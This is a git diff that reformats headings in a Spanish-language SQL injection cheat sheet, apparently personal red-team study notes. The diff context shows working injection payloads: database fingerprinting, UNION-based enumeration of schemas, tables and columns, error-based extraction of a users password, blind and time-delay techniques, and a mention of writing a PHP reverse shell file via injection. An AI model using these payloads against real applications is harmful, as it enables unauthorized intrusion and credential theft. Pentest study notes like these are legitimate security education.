@@ -7,17 +7,17 @@ sidebar:
   open: false
 ---
 
-# PARTE 1
+## PARTE 1
 
-## LISTAMOS INFORMACION DE LA BASE DE DATOS
+### LISTAMOS INFORMACION DE LA BASE DE DATOS
 
-### TIPO DE BASE DE DATOS
+#### TIPO DE BASE DE DATOS
 
 ![](/images/red_team/web/20241030124059.png)
 
 ![](/images/red_team/web/20241030124147.png)
 
-### TIPO Y VERSION DE BASE DE DATOS
+#### TIPO Y VERSION DE BASE DE DATOS
 
 PostgreSQL
 
@@ -38,7 +38,7 @@ SELECT banner FROM v$version
 SELECT version FROM v$instance
 ```
 
-### USUARIO DB QUE EJECUTA LA BASE DE DATOS
+#### USUARIO DB QUE EJECUTA LA BASE DE DATOS
 
 PostgreSQL
 
@@ -73,7 +73,7 @@ SELECT USER FROM dual;
 SELECT SYS_CONTEXT('USERENV', 'CURRENT_USER') FROM dual;
 ```
 
-### BASE DE DATOS ACTIVA
+#### BASE DE DATOS ACTIVA
 
 PostgreSQL, MySQL y MariaDB ,Oracle
 
@@ -87,7 +87,7 @@ Microsoft SQL Server
 SELECT DB_NAME();
 ```
 
-### FECHA Y HORA ACTUAL
+#### FECHA Y HORA ACTUAL
 
 PostgreSQL, MySQL y MariaDB ,Oracle , Microsoft SQL Server
 
@@ -95,7 +95,7 @@ PostgreSQL, MySQL y MariaDB ,Oracle , Microsoft SQL Server
 SELECT CURRENT_TIMESTAMP;
 ```
 
-### ID DE SESSION
+#### ID DE SESSION
 
 PostgreSQL
 
@@ -121,7 +121,7 @@ Oracle
 SELECT SYS_CONTEXT('USERENV', 'SID') FROM dual;
 ```
 
-### USUARIO DEL SISTEMA OPERATIVO
+#### USUARIO DEL SISTEMA OPERATIVO
 
 PostgreSQL
 
@@ -141,7 +141,7 @@ Oracle
 SELECT SYS_CONTEXT('USERENV', 'OS_USER') FROM dual;
 ```
 
-### MODO SQL ACTIVO
+#### MODO SQL ACTIVO
 
 MySQL y MariaDB
 
@@ -149,7 +149,7 @@ MySQL y MariaDB
 SELECT COUNT(*) FROM pg_stat_activity;
 ```
 
-### PARAMETROS DE CONFIGURACION
+#### PARAMETROS DE CONFIGURACION
 
 AQUI PODEMOS VER VARIABLES BASE DE DATOS  DEL SISTEMA , NO DEL USUARIO , ESO SE HACE MANUAL CON :  SELECT @mi_variable1 AS 'Variable 1';
 
@@ -171,7 +171,7 @@ Oracle
 SELECT name, value FROM v$parameter;
 ```
 
-### PRIVILEGIOS Y ROLES
+#### PRIVILEGIOS Y ROLES
 
 PostgreSQL
 
@@ -199,21 +199,21 @@ SELECT * FROM user_role_privs;
 
 EXTRA:
 
-## INJECCION DE CODIGO PHP EN SQL PARA LUEGO QUE PHP CUANDO LO RENDERISE LO INTERPRETE
+### INJECCION DE CODIGO PHP EN SQL PARA LUEGO QUE PHP CUANDO LO RENDERISE LO INTERPRETE
 
 ![](/images/red_team/web/20241030214310.png)
 
-## INJECCION DE CODIGO PHP A UN ARCHIVO Y LUEGO LEERLO DESDE UNA RUTA
+### INJECCION DE CODIGO PHP A UN ARCHIVO Y LUEGO LEERLO DESDE UNA RUTA
 
 -supongamos que puedas guardar este codigo php en /var/www/web1/reverse.php
 luego tu podrias apuntar desde la web hacia <http://host/reverse.php> y esto podria interpretarse
 ![](/images/red_team/web/20241030214636.png)
 
-## LEER ARCHIVOS DE LA MAQUINA  
+### LEER ARCHIVOS DE LA MAQUINA  
 
 ![](/images/red_team/web/20241030214417.png)
 
-# PARTE 2
+## PARTE 2
 
 CHEAT SHEET:
 <https://portswigger.net/web-security/sql-injection/cheat-sheet>
@@ -225,11 +225,11 @@ BUSCAR DATO VISIBLE
 
 INFORMACION DE LA DB , USUARIO DB ,  USUARIO ETC/PASSWD , VERSION  Y OTRAS COSAS MAS EN EXTRA V1 : [[EXTRA V1]]
 
-# COSAS IMPORTANTES
+## COSAS IMPORTANTES
 
--probar variantes tipo comentarios (  -- -  |  --  |   ;   |   #  )
+-probar variantes tipo comentarios (  -- -  |  --  |   ;   |   ##  )
 
-# LISTAR BASE DE DATOS
+## LISTAR BASE DE DATOS
 
 URL VULNERABLE A SQLI
 
@@ -237,11 +237,11 @@ URL VULNERABLE A SQLI
 ![[Pasted image 20241030122521.png]]
 DETERMINAMOS EL TAMAÑO DE LA TABLA
 
-## MYSQL
+### MYSQL
 
-### ORDER BY
+#### ORDER BY
 
-#### MYSQL-PostgreSQL ORACLE
+##### MYSQL-PostgreSQL ORACLE
 
 ```python
 CODE_VULNERABLE' ORDER BY 1 -- -
@@ -256,9 +256,9 @@ EJEMPLO:SI FUNCIONA EN 1 Y 2 , PERO FALLA EN 3 , ESPORQUE NO EXISTE LA 3 COLUMNA
 
 CORROBORAMOS ESTO CON EL UNION
 
-### UNION
+#### UNION
 
-#### MYSQL-PostgreSQL
+##### MYSQL-PostgreSQL
 
 ```python
 CODE_VULNERABLE' UNION SELECT NULL -- -
@@ -268,7 +268,7 @@ CODE_VULNERABLE' UNION SELECT NULL,NULL -- -
 CODE_VULNERABLE' UNION SELECT NULL,NULL,NULL -- -
 ```
 
-#### ORACLE
+##### ORACLE
 
 ```python
 CODE_VULNERABLE' UNION SELECT NULL FROM DUAL -- -
@@ -281,9 +281,9 @@ CODE_VULNERABLE' UNION SELECT NULL,NULL,NULL FROM DUAL -- -
 donde si colocamos  "NULL,NULL,NULL" daría error
 ![[Pasted image 20241030123612.png]]
 
-# OBTENER LAS BASE DE DATOS DISPONIBLES
+## OBTENER LAS BASE DE DATOS DISPONIBLES
 
-## MYSQL-PostgreSQL
+### MYSQL-PostgreSQL
 
 ```SQL
 code' UNION SELECT schema_name FROM information_schema.schemata -- -
@@ -291,7 +291,7 @@ code' UNION SELECT schema_name FROM information_schema.schemata -- -
 
 ![[Pasted image 20241030182002.png]]
 
-## ORACLE
+### ORACLE
 
 !!!!solo puedes ver la base de datos en la que estas !!!
 
@@ -302,9 +302,9 @@ code' UNION SYS_CONTEXT('USERENV', 'DB_NAME') FROM DUAL -- -
 
 ![[Pasted image 20241030223309.png]]
 
-# OBTENER TABLAS DE LA BASE DE DATOS
+## OBTENER TABLAS DE LA BASE DE DATOS
 
-## MYSQL-PostgreSQL
+### MYSQL-PostgreSQL
 
 ```SQL
 code' UNION SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema='*name-database' -- -
@@ -312,7 +312,7 @@ code' UNION SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=
 
 ![[Pasted image 20241030184826.png]]
 
-## ORACLE
+### ORACLE
 
 ```PYTHON
 code' UNION SELECT TABLE_NAME FROM USER_TABLES -- -
@@ -323,9 +323,9 @@ code' UNION SELECT OWNER,TABLE_NAME FROM DBA_TABLES -- -
 
 ![[Pasted image 20241030224215.png]]
 
-# OBTENER COLUMNAS DE LA BASE DE DATOS
+## OBTENER COLUMNAS DE LA BASE DE DATOS
 
-## MYSQL-PostgreSQL
+### MYSQL-PostgreSQL
 
 ```SQL
 code' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='*nombre-tabla*' -- -
@@ -333,7 +333,7 @@ code' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME=
 
 ![[Pasted image 20241030184659.png]]
 
-## ORACLE
+### ORACLE
 
 EN TODOS LOS CASOS SE PUEDE SACAR MAS INFORMACION DE LA TABLA
 
@@ -352,9 +352,9 @@ code' UNION SELECT COLUMN_NAME FROM DBA_TAB_COLUMNS WHERE TABLE_NAME='*nombre-ta
 
 ![[Pasted image 20241030225403.png]]
 
-# OBTENER COLUMNAS DE LA BASE DE DATOS
+## OBTENER COLUMNAS DE LA BASE DE DATOS
 
-## MYSQL-PostgreSQL
+### MYSQL-PostgreSQL
 
 ```SQL
 code' UNION SELECT COLUMNA1,COLUMNA2 FROM *table-name*  -- -
@@ -362,7 +362,7 @@ code' UNION SELECT COLUMNA1,COLUMNA2 FROM *table-name*  -- -
 
 ![[Pasted image 20241030190322.png]]
 
-## ORACLE
+### ORACLE
 
 ```SQL
 code' UNION SELECT COLUMNA1,COLUMNA2 FROM *table-name*  -- -
@@ -370,11 +370,11 @@ code' UNION SELECT COLUMNA1,COLUMNA2 FROM *table-name*  -- -
 
 ![[Pasted image 20241030230113.png]]
 
-# BLIND SQLI(sql injection blind)
+## BLIND SQLI(sql injection blind)
 
 [SQL INJECION - SQLI CHEAT SHEET LUND133369](https://lund133369.github.io/SQLI-sql-injection-cheet-sheet)
 
-## CONDITIONAL REPONSE
+### CONDITIONAL REPONSE
 
 condicion de respuesta
 la respuesta se puede filtrar por varios tipos como :
@@ -382,7 +382,7 @@ la respuesta se puede filtrar por varios tipos como :
 - r.status_code  ,  r.headers  ,  r.cookies  ,  r.text  ,  r.json()  ,  r.url
 ![[Pasted image 20241106152731.png]]
 
-## CONDITIONAL ERRORS
+### CONDITIONAL ERRORS
 
 condicion de error
 
@@ -399,7 +399,7 @@ TIPO OR - ||
 
 ![[Pasted image 20241108192538.png]]
 
-## CONDITIONAL VISIBLE ERROR-BASED
+### CONDITIONAL VISIBLE ERROR-BASED
 
 condicion visible basado en error
 
@@ -409,7 +409,7 @@ CODE' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 
 ![[Pasted image 20241113173941.png]]
 
-## CONDITIONAL TIME DELAYS
+### CONDITIONAL TIME DELAYS
 
 condicion tiempo
 ![[Pasted image 20241113175218.png]]
@@ -417,40 +417,40 @@ condicion tiempo
 la peticion demora mas de 5 segundos es que si es vulnerable
 ![[Pasted image 20241113183407.png]]
 
-## CONDITIONAL TIME DELAYS AND INFORMATION RETRIEVAL
+### CONDITIONAL TIME DELAYS AND INFORMATION RETRIEVAL
 
 condicion tiempo y recuperacion de informacion
 ![[Pasted image 20241113183218.png]]
 
-## CONDITIONAL WITH OUT-OF-BAN INTERACTION
+### CONDITIONAL WITH OUT-OF-BAN INTERACTION
 
 condicion con interacion de ban
 
-## CONDITIONAL WITH OUT-OF-BAN EXFILTRATION
+### CONDITIONAL WITH OUT-OF-BAN EXFILTRATION
 
 condicion con exfiltracion de ban
 
-## CONDITIONAL WITH FILTER BYPASS VIA XML
+### CONDITIONAL WITH FILTER BYPASS VIA XML
 
 condicion con evasion de filtro via xml
 
-# EXTRA
+## EXTRA
 
-## CONTACTENACION
+### CONTACTENACION
 
-### strings concatenation (listar múltiple  data en una sola columna)
+#### strings concatenation (listar múltiple  data en una sola columna)
 
 ![[Pasted image 20241106130536.png]]
 
-#### USANDO CONCATENADORES
+##### USANDO CONCATENADORES
 
 ![[Pasted image 20241106132204.png]]
 
-#### USANDO  CONCAT  O GROUP_CONCAT
+##### USANDO  CONCAT  O GROUP_CONCAT
 
 ![[Pasted image 20241106132303.png]]
 
-## LONGITUD DE UN RESULTADO(sql len , length)
+### LONGITUD DE UN RESULTADO(sql len , length)
 
 En SQL, para obtener la longitud del resultado de una consulta, puedes usar funciones específicas para medir la longitud de cadenas de texto. La función varía según el motor de base de datos:
 
